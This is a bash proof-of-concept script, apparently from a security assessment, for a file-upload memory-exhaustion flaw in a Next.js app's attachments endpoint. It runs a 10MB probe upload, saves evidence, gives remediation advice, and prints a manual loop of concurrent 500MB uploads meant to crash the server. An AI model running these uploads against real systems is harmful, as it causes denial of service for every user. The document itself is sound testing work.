#!/usr/bin/env bash
# A1 — File Upload Memory Exhaustion (OOM)
#
# Finding: POST /api/attachments calls file.arrayBuffer() with no global size
# limit before allocation. A large upload allocates that size in Node.js RAM.
# Multiple concurrent large uploads can exhaust available memory.
#
# Requires: Any user with attachment upload permission
# Impact: Node.js process OOM crash, service disruption for all users
#
# Expected (secure): 413 Content Too Large or 400 with size error before buffer
# Expected (insecure): Server accepts upload, allocates memory, potentially OOM
#
# CVSS v3: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (6.5 Medium)
#
# WARNING: Run this in a test environment only. A successful test may crash the server.

set -uo pipefail

TARGET="${TARGET:-10.0.63.14}"
APP_PORT="${APP_PORT:-3000}"
BASE_URL="${BASE_URL:-http://$TARGET:$APP_PORT}"
ADMIN_COOKIE="${ADMIN_COOKIE:-}"
EVIDENCE_FILE="${EVIDENCE_FILE:-$(dirname "$0")/../evidence/A1-upload-oom.txt}"

# Test file size in MB — start small to probe, don't crash prod
SMALL_SIZE_MB="${SMALL_SIZE_MB:-10}"
LARGE_SIZE_MB="${LARGE_SIZE_MB:-100}"

# Entity to attach to (must exist)
ENTITY_ID="${ENTITY_ID:-customers:person}"
RECORD_ID="${RECORD_ID:-}"

mkdir -p "$(dirname "$EVIDENCE_FILE")"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

{
echo "================================================================"
echo " A1: File Upload Memory Exhaustion"
echo " Target: $BASE_URL"
echo " Timestamp: $TIMESTAMP"
echo " WARNING: Large uploads may crash the server"
echo "================================================================"
echo ""

if [[ -z "$ADMIN_COOKIE" ]]; then
  echo "[!] ADMIN_COOKIE not set. Run: source poc/auth.sh"
  echo ""
  echo "--- PoC (manual) ---"
  echo ""
  echo "# Test 1: Check if server enforces a size limit"
  echo "dd if=/dev/zero bs=1M count=50 2>/dev/null | \\"
  echo "  curl -s -X POST $BASE_URL/api/attachments \\"
  echo "    -H 'Cookie: auth_token=<token>' \\"
  echo "    -F 'file=@/dev/stdin;type=application/octet-stream;filename=test.bin' \\"
  echo "    -F 'entityId=customers:person' \\"
  echo "    -F 'recordId=<any-uuid>' \\"
  echo "    -w '\nHTTP:%{http_code}'"
  echo ""
  echo "# If VULNERABLE: HTTP 200, server allocated 50MB+ in RAM"
  echo "# If PATCHED: HTTP 413 or 400 before Content-Length check"
  echo ""
  echo "# Test 2: Concurrent uploads to trigger OOM"
  echo "for i in {1..5}; do"
  echo "  dd if=/dev/zero bs=1M count=500 2>/dev/null | \\"
  echo "    curl -s -X POST $BASE_URL/api/attachments ... &"
  echo "done; wait"
  echo "================================================================"
  exit 0
fi

if [[ -z "$RECORD_ID" ]]; then
  echo "[*] RECORD_ID not set — trying to find a customer record to attach to"
  PEOPLE=$(curl -s --max-time 10 "$BASE_URL/api/customers/people?pageSize=1" \
    -H "Cookie: $ADMIN_COOKIE" 2>/dev/null)
  RECORD_ID=$(echo "$PEOPLE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['items'][0]['id'])" 2>/dev/null || echo "")
  if [[ -z "$RECORD_ID" ]]; then
    echo "[!] Could not find a record. Set RECORD_ID=<uuid> and re-run."
    exit 1
  fi
  echo "[*] Using record: $RECORD_ID"
fi

# Generate test file
TMPFILE=$(mktemp /tmp/om_upload_test_XXXXX.bin)
trap "rm -f $TMPFILE" EXIT

echo "--- Test 1: ${SMALL_SIZE_MB}MB upload — check size limit enforcement ---"
dd if=/dev/zero of="$TMPFILE" bs=1M count="$SMALL_SIZE_MB" 2>/dev/null
FILE_SIZE=$(wc -c < "$TMPFILE")
echo "File size: $(echo "$FILE_SIZE / 1048576" | bc)MB"

echo "Command: curl -X POST $BASE_URL/api/attachments -F file=@${SMALL_SIZE_MB}MB.bin ..."
START_TIME=$(date +%s%N)
RESP=$(curl -s --max-time 120 -X POST "$BASE_URL/api/attachments" \
  -H "Cookie: $ADMIN_COOKIE" \
  -F "file=@$TMPFILE;type=application/octet-stream;filename=security_test_${SMALL_SIZE_MB}mb.bin" \
  -F "entityId=$ENTITY_ID" \
  -F "recordId=$RECORD_ID" \
  -w "\nHTTP:%{http_code}" 2>/dev/null)
END_TIME=$(date +%s%N)
ELAPSED=$(( (END_TIME - START_TIME) / 1000000 ))

HTTP_CODE=$(echo "$RESP" | tail -1 | cut -d: -f2)
BODY=$(echo "$RESP" | head -n -1)

echo "HTTP: $HTTP_CODE | Time: ${ELAPSED}ms"
echo "Response: $(echo "$BODY" | python3 -m json.tool 2>/dev/null | head -10 || echo "$BODY")"
echo ""

case "$HTTP_CODE" in
  200|201)
    echo "RESULT: VULNERABLE — Server accepted ${SMALL_SIZE_MB}MB upload without size rejection"
    echo "        Server allocated ~${SMALL_SIZE_MB}MB RAM to process this upload"
    echo "        Concurrent uploads would multiply this impact"
    ATT_ID=$(echo "$BODY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id',''))" 2>/dev/null)
    if [[ -n "$ATT_ID" ]]; then
      echo "        Attachment created: $ATT_ID (cleaning up...)"
      curl -s --max-time 10 -X DELETE "$BASE_URL/api/attachments/$ATT_ID" \
        -H "Cookie: $ADMIN_COOKIE" > /dev/null 2>&1
    fi
    ;;
  413)
    echo "RESULT: PROTECTED — Server rejected with 413 Content Too Large"
    ;;
  400)
    echo "RESULT: PROTECTED — Server rejected with 400 (check error message)"
    ;;
  *)
    echo "RESULT: INCONCLUSIVE — HTTP $HTTP_CODE"
    ;;
esac

echo ""
echo "--- Summary ---"
echo "Next.js default body limit: ~4MB"
echo "Test upload size: ${SMALL_SIZE_MB}MB"
echo "If 200 returned: no explicit limit before arrayBuffer() allocation"
echo ""
echo "Remediation:"
echo "  Check Content-Length header before calling file.arrayBuffer():"
echo "  const contentLength = req.headers.get('content-length')"
echo "  if (Number(contentLength) > MAX_BYTES) return 413"
echo "  OR configure Next.js body size limit in route config"
echo "================================================================"
} | tee "$EVIDENCE_FILE"

echo "[+] Evidence saved to: $EVIDENCE_FILE"
